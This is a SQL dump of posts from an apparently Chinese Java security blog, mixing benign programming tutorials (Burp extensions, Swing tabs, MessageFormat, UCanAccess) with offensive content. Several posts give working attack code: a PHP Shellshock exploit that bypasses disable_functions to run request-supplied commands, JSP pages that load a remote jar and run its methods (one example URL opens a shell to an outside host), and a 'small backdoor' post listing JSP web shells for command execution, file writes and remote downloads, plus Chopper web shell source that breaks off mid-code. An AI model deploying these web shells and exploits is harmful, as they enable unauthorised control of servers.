<li>自定义Burp的HTTP消息编辑器处理Burp不支持的数据格式</li></p>\n<p>	<li>获取headers, parameters, cookies分析HTTP请求和响应</li></p>\n<p>	<li>读取或修改Burp配置设置</li></p>\n<p>	<li>保存或恢复Burp状态</li></p>\n<p></ol></p>\n<p><h1>0x02 学习API</h1></p>\n<p><hr /></p>\n<p>API下载地址：http://portswigger.net/burp/extender/api/burp_extender_api.zip</p>\n<p>下载API后新建Eclipse项目导入API文件：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/11/23.jpg\"><img class=\"alignnone size-full wp-image-1577\" src=\"http://javaweb.org/wp-content/uploads/2014/11/23.jpg\" alt=\"2\" width=\"965\" height=\"703\" /></a></p>\n<p>不急于动手写代码，先看下官方的Demo：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/11/33.jpg\"><img class=\"alignnone size-full wp-image-1578\" src=\"http://javaweb.org/wp-content/uploads/2014/11/33.jpg\" alt=\"3\" width=\"620\" height=\"633\" /></a></p>\n<p>下载第一个HelloWorld解压它并复制BurpExtender.java到我们的项目当中：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/11/42.jpg\"><img class=\"alignnone size-full wp-image-1579\" src=\"http://javaweb.org/wp-content/uploads/2014/11/42.jpg\" alt=\"4\" width=\"919\" height=\"213\" /></a></p>\n<p>BurpExtender.java：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/11/52.jpg\"><img class=\"alignnone size-full wp-image-1580\" src=\"http://javaweb.org/wp-content/uploads/2014/11/52.jpg\" alt=\"5\" width=\"690\" height=\"490\" /></a></p>\n<p>BurpExtender.java实现了IBurpExtender接口，而IBurpExtender仅定义了一个方法：registerExtenderCallbacks(注册扩展回调方法)：</p>\n<pre class=\"brush: java; gutter: true\">public interface  IBurpExtender{\n         /**\n          * 这个方法将在扩展加载的时候.他将会注册一个\n          *&lt;code&gt;IBurpExtenderCallbacks&lt;/code&gt; 接口实例,可通过扩展\n          * 实现各种调用\n          *@param回调一个\n          *&lt;code&gt;IBurpExtenderCallbacks&lt;/code&gt;对象.\n          */\n         void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks);\n}</pre>\n<p>在确认代码无任何错误后选中项目并导出为jar,建议安装一个打jar包的插件:Build Fat Jar这样你就可以非常方便的把整个项目打成一个jar包了.</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/11/62.jpg\"><img class=\"alignnone size-full wp-image-1581\" src=\"http://javaweb.org/wp-content/uploads/2014/11/62.jpg\" alt=\"6\" width=\"932\" height=\"657\" /></a></p>\n<p>如果你和我一样从来都没有使用过BurpSuite，那么不妨先打开它把玩几分钟。在extender(扩展)标签当中看到了Burp的插件加载界面。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/11/71.jpg\"><img class=\"alignnone size-full wp-image-1582\" src=\"http://javaweb.org/wp-content/uploads/2014/11/71.jpg\" alt=\"7\" width=\"1126\" height=\"643\" /></a></p>\n<p>Add我们刚打好的jar包，加载到Burp扩展中去。</p>\n<p><img class=\"alignnone size-full wp-image-1583\" src=\"http://javaweb.org/wp-content/uploads/2014/11/81.jpg\" alt=\"8\" width=\"1036\" height=\"621\" /></p>\n<p>这个时候可以看到我们的插件已经成功运行了，在LoadBurpExtension中的output标签已经看到了Hello output(stdout.println(\"Hello output\");)</p>\n<p>Errors标签也输出了Hello errors()stderr.println(\"Hello errors\");</p>\n<p>对应的错误信息(throw new RuntimeException(\"Hello exceptions\");)。</p>\n<p>插件名(callbacks.setExtensionName(\"Hello world extension\");)，</p>\n<p>以及提醒面板的信息Hello alerts(callbacks.issueAlert(\"Hello alerts\");)。</p>\n<p><img class=\"alignnone size-full wp-image-1584\" src=\"http://javaweb.org/wp-content/uploads/2014/11/91.jpg\" alt=\"9\" width=\"1140\" height=\"126\" /></p>\n<p>获取到Burp混淆后的扩展加载类(自定义类加载器)：</p>\n<p><img class=\"alignnone size-full wp-image-1585\" src=\"http://javaweb.org/wp-content/uploads/2014/11/101.jpg\" alt=\"10\" width=\"886\" height=\"709\" /></p>\n<p>如你所想，java加载外部扩展利用了URLClassLoader load外部的jar(对这感兴趣的朋友可以看下p2j上的相关文章:http://javaweb.org/?s=URLClassLoader&amp;submit=Search)。</p>\n<p>第一个HelloWorld很容易就搞定了，第二个Event listeners的Demo。所谓事件监听即你可以通过Burp的IBurpExtenderCallbacks去注册自己的监听方法。Demo只提供了四种事件(包含HTTP监听、代理、Scanner、状态监听)，所有的未列举的事件直接用Eclipse的快捷键提示就出来了：</p>\n<p><img class=\"alignnone size-full wp-image-1586\" src=\"http://javaweb.org/wp-content/uploads/2014/11/112.jpg\" alt=\"11\" width=\"887\" height=\"640\" /></p>\n<p>比如想要添加一个IScopeChangeListener很简单，让当前类实现IScopeChangeListener接口，注册ScopeChange事件(callbacks.registerScopeChangeListener(this);)重写其scopeChanged方法即可。</p>\n<p><img class=\"alignnone size-full wp-image-1587\" src=\"http://javaweb.org/wp-content/uploads/2014/11/122.jpg\" alt=\"12\" width=\"1082\" height=\"367\" /></p>\n<p>设置本地浏览器代理后再次访问任意网站后回到扩展标签，选中我们的扩展程序可以看到监听中的请求已输出。</p>\n<p><img class=\"alignnone size-full wp-image-1588\" src=\"http://javaweb.org/wp-content/uploads/2014/11/132.jpg\" alt=\"13\" width=\"1022\" height=\"751\" /></p>\n<p><h1>0x03 HelloWorld</h1></p>\n<p><hr /></p>\n<p>在编写扩展的时候一定要注意，你的包里面务必包含一个BurpExtender类可以有多个类实现IBurpExtender。 创建自己的Panel并加到Burp主窗体，AppPanel是我自己写的一个应用面板。我们可以通过实现ITab 重写getTabCaption和getUiComponent方法(当然实现IBurpExtender接口是必须的)将我们自己的ui嵌套到Burp当中。getTabCaption即获取获取标题，getUiComponent获取组件这里需要给Burp返回你封装的组件对象。</p>\n<p>我们可以先写好JPanel再嵌入到Burp当中，这里提供了一个简单的ApplicationPanel小Demo:http://javaweb.org/?p=1512</p>\n<pre class=\"brush: java; gutter: true\">package burp;\nimport java.awt.Component;\nimport javax.swing.JPanel;\nimport javax.swing.SwingUtilities;\npublic class BurpExtender implements IBurpExtender, ITab {\n     private JPanel jPanel1;\n     @Override\n     public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {\n          //设置扩展名\n          callbacks.setExtensionName(&quot;应用中心&quot;);\n          //创建我们的窗体\n          SwingUtilities.invokeLater(new Runnable() {\n               @Override\n               public void run() {\n                    //我们的主窗体\n                    jPanel1 = new AppPanel();\n                    //自定义我们的组件\n                    callbacks.customizeUiComponent(jPanel1);\n                    //添加标签到Burp主窗体\n                    callbacks.addSuiteTab(BurpExtender.this);\n               }\n          });\n     }\n     @Override\n     public String getTabCaption() {\n          return &quot;应用中心&quot;;\n     }\n     @Override\n     public Component getUiComponent() {\n          return jPanel1;\n     }\n}</pre>\n<p>效果图：</p>\n<p><img class=\"alignnone size-full wp-image-1589\" src=\"http://javaweb.org/wp-content/uploads/2014/11/141.jpg\" alt=\"14\" width=\"1126\" height=\"805\" /></p>', null, '2014-11-20 20:34:20', '1', '750', null, '1', '2014-11-20 20:34:20');
INSERT INTO `sys_posts` VALUES ('1601', '5', '13', '[zone-phith0n]PHP 绕过Disable_functions执行命令', 'Anonymous', 'FROM:<a href=\"http://zone.wooyun.org/content/16631\">http://zone.wooyun.org/content/16631</a>\n<p>先简单说一下php调用mail()函数的过程。</p>\n<p>看到源码ext/mail.c</p>\n<p>236行：</p>\n<pre class=\"brush: cpp; gutter: true\">char *sendmail_path = INI_STR(&quot;sendmail_path&quot;); \nchar *sendmail_cmd = NULL;</pre>\n<p>从INI中获得sendmail_path变量。我们看看php.ini里是怎么说明的：</p>\n<pre class=\"brush: cpp; gutter: true\">; For Unix only.  You may supply arguments as well (default: &quot;sendmail -t -i&quot;). \n;sendmail_path =</pre>\n<p>注释中可以看到，send_mail默认值为\"sendmail -t -i\".</p>\n<p>extra_cmd（用户传入的一些额外参数）存在的时候，调用spprintf将sendmail_path和extra_cmd组合成真正执行的命令行sendmail_cmd 。不存在则直接将sendmail_path赋值给sendmail_cmd 。</p>\n<p>如下：</p>\n<pre class=\"brush: cpp; gutter: true\">if (!sendmail_path) { \n#if (defined PHP_WIN32 || defined NETWARE) \n    /* handle old style win smtp sending */ \n    if (TSendMail(INI_STR(&quot;SMTP&quot;), &amp;tsm_err, &amp;tsm_errmsg, hdr, subject, to, message, NULL, NULL, NULL TSRMLS_CC) == FAILURE) { \n      if (tsm_errmsg) { \n        php_error_docref(NULL TSRMLS_CC, E_WARNING, &quot;%s&quot;, tsm_errmsg); \n        efree(tsm_errmsg); \n      } else { \n        php_error_docref(NULL TSRMLS_CC, E_WARNING, &quot;%s&quot;, GetSMErrorText(tsm_err)); \n      } \n      MAIL_RET(0); \n    } \n    MAIL_RET(1); \n#else \n    MAIL_RET(0); \n#endif \n  } \n  if (extra_cmd != NULL) { \n    spprintf(&amp;sendmail_cmd, 0, &quot;%s %s&quot;, sendmail_path, extra_cmd); \n  } else { \n    sendmail_cmd = sendmail_path; \n  }</pre>\n<p>之后执行：</p>\n<pre class=\"brush: cpp; gutter: true\">#ifdef PHP_WIN32 \n  sendmail = popen_ex(sendmail_cmd, &quot;wb&quot;, NULL, NULL TSRMLS_CC); \n#else \n  /* Since popen() doesn&#039;t indicate if the internal fork() doesn&#039;t work \n   * (e.g. the shell can&#039;t be executed) we explicitly set it to 0 to be \n   * sure we don&#039;t catch any older errno value. */ \n  errno = 0; \n  sendmail = popen(sendmail_cmd, &quot;w&quot;); \n#endif</pre>\n<p>将sendmail_cmd丢给popen执行。</p>\n<p>如果系统默认sh是bash，popen就会丢给bash执行。而之前的bash破壳（CVE-2014-6271）漏洞，直接导致我们可以利用mail()函数执行任意命令，绕过disable_functions。</p>\n<p>影响版本：php 各版本</p>\n<p>修复方法：修复CVE-2014-6271</p>\n<p>给出POC（<a href=\"http://www.exploit-db.com/exploits/35146/\" target=\"_blank\">http://www.exploit-db.com/exploits/35146/</a>）如下：</p>\n<pre class=\"brush: php; gutter: true\">&lt;?php \n# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) \n# Google Dork: none \n# Date: 10/31/2014 \n# Exploit Author: Ryan King (Starfall) \n# Vendor Homepage: http://php.net \n# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror \n# Version: 5.* (tested on 5.6.2) \n# Tested on: Debian 7 and CentOS 5 and 6 \n# CVE: CVE-2014-6271 \nfunction shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 \n   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); \n   putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;); \n   // In Safe Mode, the user may only alter environment variableswhose names \n   // begin with the prefixes supplied by this directive. \n   // By default, users will only be able to set environment variablesthat \n   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, \n   // PHP will let the user modify ANY environment variable! \n   mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#039;t actuallysend any mail \n   $output = @file_get_contents($tmp); \n   @unlink($tmp); \n   if($output != &quot;&quot;) return $output; \n   else return &quot;No output, or not vuln.&quot;; \n} \necho shellshock($_REQUEST[&quot;cmd&quot;]); \n?&gt;</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/11/17.jpg\"><img class=\"alignnone size-full wp-image-1602\" src=\"http://javaweb.org/wp-content/uploads/2014/11/17.jpg\" alt=\"1\" width=\"1040\" height=\"273\" /></a></p>', null, '2014-11-24 11:21:14', '1', '847', null, '1', '2014-11-24 11:25:13'), ('1607', '1', '3', 'jsp 反射', '园长', '参数只实现了String和int,<a href=\"http://javaweb.org/?p=1533\">Cat.jar</a>\n<p>http://localhost:8080/cat.jsp?url=http://javaweb.org/Cat.jar&amp;class=Cat&amp;method=exec&amp;methodParameterClass=java.lang.String&amp;parameter=whoami</p>\n<p>http://localhost:8080/cat.jsp?url=http://javaweb.org/Cat.jar&amp;class=Cat&amp;method=shell&amp;methodParameterClass=java.lang.String&amp;methodParameterClass=int&amp;parameter=p2j.cn&amp;parameter=9527</p>\n<pre class=\"brush: java; gutter: true\">&lt;%\n	java.net.URLClassLoader ucl = new java.net.URLClassLoader(new java.net.URL[] {new java.net.URL(request.getParameter(&quot;url&quot;)) });\n	Class c = Class.forName(request.getParameter(&quot;class&quot;),true,ucl);\n	java.lang.reflect.Method[] methods = c.getDeclaredMethods();\n	java.lang.reflect.Method m = null;\n	String[] parameter = request.getParameterValues(&quot;parameter&quot;);\n	Object[] parameterClass = new Object[parameter.length];\n	for(java.lang.reflect.Method method :methods){\n		if(request.getParameter(&quot;method&quot;).equals(method.getName())){\n			if(method.getParameterTypes().length &gt;0){\n				Class[] tc = method.getParameterTypes();\n				String[] arr = new String[tc.length];\n				for(int i = 0; i &lt; tc.length; i++){\n					parameterClass[i] = &quot;java.lang.String&quot;.equals(tc[i].getName())?parameter[i]:Integer.parseInt(parameter[i]);\n					arr[i] = tc[i].getName();\n				}\n				if(java.util.Arrays.equals(request.getParameterValues(&quot;methodParameterClass&quot;),arr)){\n					m = method;\n					break ;\n				}\n			}else{\n				m = method;\n			}\n		}\n	}\n	out.println(m.invoke(c.newInstance(), parameterClass));\n%&gt;</pre>', null, '2014-11-29 22:13:16', '1', '561', null, '0', '2014-11-29 22:15:30'), ('1611', '5', '27', 'JTabbedPane 监听tab选中改变事件', 'Anonymous', '利用的是javax.swing.event.ChangeListener，原文<a href=\"http://www.java2s.com/Tutorial/Java/0240__Swing/ListeningforSelectedTabChanges.htm\">Listening for Selected Tab Changes</a>。实现方式都是callback，不过在实际当中为了方便我选择了自己写callback。\n<pre class=\"brush: java; gutter: true\">import java.awt.BorderLayout;\nimport javax.swing.JButton;\nimport javax.swing.JFrame;\nimport javax.swing.JTabbedPane;\nimport javax.swing.event.ChangeEvent;\nimport javax.swing.event.ChangeListener;\npublic class TabSample {\n	static void add(JTabbedPane tabbedPane, String label) {\n		JButton button = new JButton(label);\n		tabbedPane.addTab(label, button);\n	}\n	public static void main(String args[]) {\n		JFrame frame = new JFrame(&quot;Tabbed Pane Sample&quot;);\n		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n		JTabbedPane tabbedPane = new JTabbedPane();\n		String titles[] = { &quot;General&quot;, &quot;Security&quot;, &quot;Content&quot;, &quot;Connection&quot;, &quot;Programs&quot;, &quot;Advanced&quot; };\n		for (int i = 0, n = titles.length; i &lt; n; i++) {\n			add(tabbedPane, titles[i]);\n		}\n		ChangeListener changeListener = new ChangeListener() {\n			public void stateChanged(ChangeEvent changeEvent) {\n				JTabbedPane sourceTabbedPane = (JTabbedPane) changeEvent.getSource();\n				int index = sourceTabbedPane.getSelectedIndex();\n				System.out.println(&quot;Tab changed to: &quot;+ sourceTabbedPane.getTitleAt(index));\n			}\n		};\n		tabbedPane.addChangeListener(changeListener);\n		frame.add(tabbedPane, BorderLayout.CENTER);\n		frame.setSize(400, 150);\n		frame.setVisible(true);\n	}\n}</pre>', null, '2014-11-29 23:55:07', '1', '799', null, '2', '2014-11-29 23:59:19'), ('1617', '1', '3', 'java.text.MessageFormat.format', '园长', '<p class=\"p1\"><span class=\"s1\">public class <b>MessageFormat</b></span></p>\n<p><p class=\"p1\"><span class=\"s1\">extends <a href=\"itss://chm/java/text/Format.html\"><span class=\"s2\">Format</span></a></span></p></p>\n<p><p class=\"p2\"><span class=\"s3\">MessageFormat</span><span class=\"s1\"> 提供了以与语言无关方式生成连接消息的方式。使用此方法构造向终端用户显示的消息。</span></p></p>\n<p><p class=\"p2\"><span class=\"s3\">MessageFormat</span><span class=\"s1\"> 获取一组对象，格式化这些对象，然后将格式化后的字符串插入到模式中的适当位置。</span></p></p>\n<p><p class=\"p2\"><span class=\"s1\"><b>注：</b></span><span class=\"s3\">MessageFormat</span><span class=\"s1\"> 不同于其他 </span><span class=\"s3\">Format</span><span class=\"s1\"> 类，因为 </span><span class=\"s3\">MessageFormat</span><span class=\"s1\"> 对象是用其构造方法之一创建的（而不是使用 </span><span class=\"s3\">getInstance</span><span class=\"s1\"> 样式的工厂方法创建的）。工厂方法不是必需的，因为 </span><span class=\"s3\">MessageFormat</span><span class=\"s1\"> 本身不实现特定于语言环境的行为。特定于语言环境的行为是由所提供的模式和用于已插入参数的子格式来定义的。</span></p></p>\n<pre class=\"brush: java; gutter: true\">public class Test {\n	public static void main(String[] args) {\n		String key=&quot;好好{0}习，天天{1}上.&quot;;\n		String result=java.text.MessageFormat.format(key,new Object[]{&quot;学&quot;,&quot;向&quot;});\n		System.out.println(result);\n	}\n}</pre>\n<p>输出：好好学习，天天向上.</p>', null, '2014-12-01 16:50:28', '1', '618', null, '1', '2014-12-01 16:50:28'), ('1619', '1', '3', 'UCanAccess连接Access数据库', '园长', 'Access_JDBC30是跨平台连接access最适合的jar但收费非常的贵，Access_JDBC30的免费版有查询50次、数据小于1000的限制。UCanAccess也提供了数据连接功能，可以比较方便的读写access数据库。UCanAccess自身依赖几个jar包，比如核心的：jackcess-2.0.6.jar ，Jackcess 是一个Java 类库，用来读写微软的Access 数据库。如果设置了hsqldb，那么将会在内存中加载. 默认=true.\n<p>快速入门：<a href=\"http://ucanaccess.sourceforge.net/site.html\">http://ucanaccess.sourceforge.net/site.html</a></p>\n<p>依赖包：</p>\n<pre class=\"brush: actionscript3; gutter: true\">commons-lang-2.6.jar\ncommons-logging-1.1.1.jar\nhsqldb.jar\njackcess-2.0.6.jar\nucanaccess-2.0.9.2.jar</pre>\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1dDgXV4d\">UCanAccess-2.0.9.2-bin.zip</a></p>\n<p>连接方式如下：</p>\n<pre class=\"brush: java; gutter: true\">import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n/**\n *\n * @author yz\n */\npublic class TestAccessMDB {\n    public static void main(String[] args) {\n        try {\n            Class.forName(&quot;net.ucanaccess.jdbc.UcanaccessDriver&quot;);\n            String pwd = new String(new byte[]{(byte) 0xc3,(byte) 0xdc,0x0d,0x09,0x0a,(byte) 0xc2,(byte) 0xeb,0x02},&quot;GBK&quot;);\n            Connection conn = DriverManager.getConnection(&quot;jdbc:ucanaccess:///Users/yz/db.mdb&quot;,&quot;&quot;,pwd);\n            Statement s = conn.createStatement();\n            ResultSet rs = s.executeQuery(&quot;SELECT * FROM site&quot;);\n            while (rs.next()) {\n                System.out.println(rs.getObject(6));\n            }\n        } catch (Exception ex) {\n            Logger.getLogger(TestAccessMDB.class.getName()).log(Level.SEVERE, null, ex);\n        }\n    }\n}</pre>', null, '2014-12-07 16:20:20', '1', '931', null, '1', '2014-12-07 16:20:21'), ('1625', '1', '27', 'RSyntaxTextArea 在OS X下 css背景渲染速度非常慢的bug', '园长', '很久就发现了一个RSyntaxTextArea在OS X下加载某些脚本文件的时候非常卡，不知道是什么原因。最近终于忍无可忍了跑去问了下RSyntaxTextArea作者得知这个bug已经在RSyntaxTextArea的最新版修复了。\n<p>问题大概发生的情况是：setSyntaxEditingStyle为SYNTAX_STYLE_JSP，然后jsp当中包含了如下css样式字符串如：</p>\n<pre class=\"brush: css; gutter: true\">body {background-color: #ffffff;color: #000000;} \nbody {background-color: #ffffff;color: #000000;} \nbody {background-color: #ffffff;color: #000000;} \nbody {background-color: #ffffff;color: #000000;} \nbody {background-color: #ffffff;color: #000000;} \nbody {background-color: #ffffff;color: #000000;} \nbody {background-color: #ffffff;color: #000000;} \nbody {background-color: #ffffff;color: #000000;} \nbody {background-color: #ffffff;color: #000000;} \nbody {background-color: #ffffff;color: #000000;}</pre>\n<p>加载或者点击鼠标的时候会一阵狂卡，让人无法人无法忍受。</p>\n<p>修复后的版本下载：<a href=\"http://pan.baidu.com/s/1pJ9Kagz\">RSyntaxTextArea.2.5.6.jar</a></p>', null, '2014-12-16 23:14:28', '1', '695', null, '0', '2014-12-17 11:27:33'), ('1627', '1', '13', 'jsp小后门', '园长', '<strong>一：执行系统命令:</strong> \r\n<p>\r\n	<strong>无回显执行系统命令：</strong> \r\n</p>\r\n<pre class=\"brush: java; gutter: true\">&lt;%Runtime.getRuntime().exec(request.getParameter(\"i\"));%&gt;</pre>\r\n请求：http://192.168.16.240:8080/Shell/cmd2.jsp?i=ls\r\n执行之后不会有任何回显，用来反弹个shell很方便。 <strong>有回显带密码验证的:</strong> \r\n<pre class=\"brush: java; gutter: true\">&lt;% if(\"023\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"\r\n<pre>\");\r\n		while((a=in.read(b))!=-1){\r\n			out.println(new String(b,0,a));\r\n		}\r\n		out.print(\"</pre>\r\n\");\r\n	}\r\n%&gt;</pre>\r\n<p>\r\n	请求：http://192.168.16.240:8080/Shell/cmd2.jsp?pwd=023&amp;i=ls\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/12/1.jpg\"><img class=\"alignnone size-full wp-image-1628\" src=\"http://javaweb.org/wp-content/uploads/2014/12/1.jpg\" alt=\"1\" width=\"562\" height=\"463\" /></a> \r\n</p>\r\n<p>\r\n	二、把字符串编码后写入指定文件的：\r\n</p>\r\n<p>\r\n	1:\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">&lt;%new java.io.FileOutputStream(request.getParameter(\"f\")).write(request.getParameter(\"c\").getBytes());%&gt;</pre>\r\n请求：http://localhost:8080/Shell/file.jsp?f=/Users/yz/wwwroot/2.txt&amp;c=1234\r\n写入web目录：\r\n<pre class=\"brush: java; gutter: true\">&lt;%new java.io.FileOutputStream(application.getRealPath(\"/\")+\"/\"+request.getParameter(\"f\")).write(request.getParameter(\"c\").getBytes());%&gt;</pre>\r\n请求：http://localhost:8080/Shell/file.jsp?f=2.txt&amp;c=1234\r\n2:\r\n<pre class=\"brush: java; gutter: true\">&lt;%new java.io.RandomAccessFile(request.getParameter(\"f\"),\"rw\").write(request.getParameter(\"c\").getBytes()); %&gt;</pre>\r\n请求：http://localhost:8080/Shell/file.jsp?f=/Users/yz/wwwroot/2.txt&amp;c=1234\r\n写入web目录:\r\n<pre class=\"brush: java; gutter: true\">&lt;%new java.io.RandomAccessFile(application.getRealPath(\"/\")+\"/\"+request.getParameter(\"f\"),\"rw\").write(request.getParameter(\"c\").getBytes()); %&gt;</pre>\r\n请求：http://localhost:8080/Shell/file.jsp?f=2.txt&amp;c=1234\r\n三：下载远程文件(不用apache io utils的话没办法把inputstream转byte,所以很长...)\r\n<pre class=\"brush: java; gutter: true\">&lt;% java.io.InputStream in = new java.net.URL(request.getParameter(\"u\")).openStream(); byte[] b = new byte[1024]; java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream(); int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } new java.io.FileOutputStream(request.getParameter(\"f\")).write(baos.toByteArray()); %&gt;</pre>\r\n<p>\r\n	请求：http://localhost:8080/Shell/download.jsp?f=/Users/yz/wwwroot/1.png&amp;u=http://www.baidu.com/img/bdlogo.png\r\n</p>\r\n<p>\r\n	下载到web路径:\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">&lt;% java.io.InputStream in = new java.net.URL(request.getParameter(\"u\")).openStream(); byte[] b = new byte[1024]; java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream(); int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } new java.io.FileOutputStream(application.getRealPath(\"/\")+\"/\"+ request.getParameter(\"f\")).write(baos.toByteArray()); %&gt;</pre>\r\n<p>\r\n	请求：http://localhost:8080/Shell/download.jsp?f=1.png&amp;u=http://www.baidu.com/img/bdlogo.png\r\n</p>\r\n<p>\r\n	四：反射调用外部jar,完美后门\r\n</p>\r\n<p>\r\n	如果嫌弃上面的后门功能太弱太陈旧可以试试这个：\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">&lt;%=Class.forName(\"Load\",true,new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(request.getParameter(\"u\"))})).getMethods()[0].invoke(null, new Object[]{request.getParameterMap()})%&gt;</pre>\r\n请求：http://192.168.16.240:8080/Shell/reflect.jsp?u=http://javaweb.org/Cat.jar&amp;023=A <a href=\"http://javaweb.org/wp-content/uploads/2014/12/2.jpg\"><img class=\"alignnone size-full wp-image-1629\" src=\"http://javaweb.org/wp-content/uploads/2014/12/2.jpg\" alt=\"2\" width=\"557\" height=\"197\" /></a> 菜刀连接：http://192.168.16.240:8080/Shell/reflect.jsp?u=http://javaweb.org/Cat.jar，密码023. <a href=\"http://javaweb.org/wp-content/uploads/2014/12/3.jpg\"><img class=\"alignnone size-full wp-image-1630\" src=\"http://javaweb.org/wp-content/uploads/2014/12/3.jpg\" alt=\"3\" width=\"467\" height=\"237\" /></a> 解：\r\n利用反射加载一个外部的jar到当前应用，反射执行输出处理结果。request.getParameterMap()包含了请求的所有参数。由于加载的是外部的jar包，所以要求服务器必须能访问到这个jar地址。\r\n下载：<a class=\"ke-insertfile\" href=\"/uploads/file/20180428/20180428062255_142.jar\" target=\"_blank\">Cat.jar</a> Load代码：\r\n<pre class=\"brush: java; gutter: true\">import java.io.IOException;\r\nimport java.util.HashMap;\r\nimport java.util.Map;\r\nimport java.util.Map.Entry;\r\n/*\r\n * To change this license header, choose License Headers in Project Properties.\r\n * To change this template file, choose Tools | Templates\r\n * and open the template in the editor.\r\n */\r\n/**\r\n *\r\n * @author yz\r\n */\r\npublic class Load {\r\n    public static String load(Map<string,string[]> map){\r\n        try {\r\n            Map<string,string> request = new HashMap<string,string>();\r\n            for (Entry<string, string[]=\"\"> entrySet : map.entrySet()) {\r\n                String key = entrySet.getKey();\r\n                String value = entrySet.getValue()[0];\r\n                request.put(key, value);\r\n            }\r\n            return new Chopper().doPost(request);\r\n        } catch (IOException ex) {\r\n            return ex.toString();\r\n        }\r\n    }\r\n}</string,></string,string></string,string></string,string[]></pre>\r\n<p>\r\n	Chopper代码：\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">import java.io.BufferedInputStream;\r\nimport java.io.BufferedReader;\r\nimport java.io.BufferedWriter;\r\nimport java.io.ByteArrayOutputStream;\r\nimport java.io.File;\r\nimport java.io.FileInputStream;\r\nimport java.io.FileOutputStream;\r\nimport java.io.IOException;\r\nimport java.io.InputStream;\r\nimport java.io.InputStreamReader;\r\nimport java.io.OutputStreamWriter;\r\nimport java.lang.reflect.Method;\r\nimport java.net.HttpURLConnection;\r\nimport java.net.URL;\r\nimport java.net.URLClassLoader;\r\nimport java.sql.Connection;\r\nimport java.sql.DriverManager;\r\nimport java.sql.ResultSet;\r\nimport java.sql.ResultSetMetaData;\r\nimport java.sql.Statement;\r\nimport java.text.SimpleDateFormat;\r\nimport java.util.Date;\r\nimport java.util.Map;\r\npublic class Chopper{\r\n    public static String getPassword() throws IOException {\r\n        return \"023\";\r\n    }\r\n    String cs = \"UTF-8\";\r\n    String encoding(String s) throws Exception {\r\n        return new String(s.getBytes(\"ISO-8859-1\"), cs);\r\n    }\r\n    Connection getConnection(String s) throws Exception {\r\n        String[] x = s.trim().split(\"\\r\\n\");\r\n        try {\r\n            Class.forName(x[0].trim());\r\n        } catch (ClassNotFoundException e) {\r\n            boolean classNotFound = true;\r\n            BufferedReader br = new BufferedReader(new InputStreamReader(this.getClass().getResourceAsStream(\"/map.txt\")));\r\n            String str = \"\";\r\n            while ((str = br.readLine()) != null) {\r\n                String[] arr = str.split(\"=\");\r\n                if (arr.length == 2 &amp;&amp; arr[0].trim().equals(x[0].trim())) {\r\n                    try {\r\n                        URLClassLoader ucl = (URLClassLoader) ClassLoader.getSystemClassLoader();\r\n                        Method m = URLClassLoader.class.getDeclaredMethod(\"addURL\", URL.class);\r\n                        m.setAccessible(true);\r\n                        m.invoke(ucl, new Object[]{new URL(arr[1])});\r\n                        Class.forName(arr[0].trim());\r\n                        classNotFound = false;\r\n                        break;\r\n                    } catch (ClassNotFoundException ex) {\r\n                        throw ex;\r\n                    }\r\n                }\r\n            }\r\n            if (classNotFound) {\r\n                throw e;\r\n            }\r\n        }\r\n        if (x[1].contains(\"jdbc:oracle\")) {\r\n            return DriverManager.getConnection(x[1].trim() + \":\" + x[4],\r\n                    x[2].equalsIgnoreCase(\"[/null]\") ? \"\" : x[2],\r\n                    x[3].equalsIgnoreCase(\"[/null]\") ? \"\" : x[3]);\r\n        } else {\r\n            Connection c = DriverManager.getConnection(x[1].trim(),\r\n                    x[2].equalsIgnoreCase(\"[/null]\") ? \"\" : x[2],\r\n                    x[3].equalsIgnoreCase(\"[/null]\") ? \"\" : x[3]);\r\n            if (x.length &gt; 4) {\r\n                c.setCatalog(x[4]);\r\n            }\r\n            return c;\r\n        }\r\n    }\r\n    void listRoots(ByteArrayOutputStream out) throws Exception {\r\n        File r[] = File.listRoots();\r\n        for (File f : r) {\r\n            out.write((f.getName()).getBytes(cs));\r\n        }\r\n    }\r\n    void dir(String s, ByteArrayOutputStream out) throws Exception {\r\n        File l[] = new File(s).listFiles();\r\n        for (File f : l) {\r\n            String mt = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").format(new Date(f.lastModified()));\r\n            String rw = f.canRead() ? \"R\" : \"\" + (f.canWrite() ? \" W\" : \"\");\r\n            out.write((f.getName() + (f.isDirectory() ? \"/\" : \"\") + \"\\t\" + mt + \"\\t\" + f.length() + \"\\t\" + rw + \"\\n\").getBytes(cs));\r\n        }\r\n    }\r\n    void 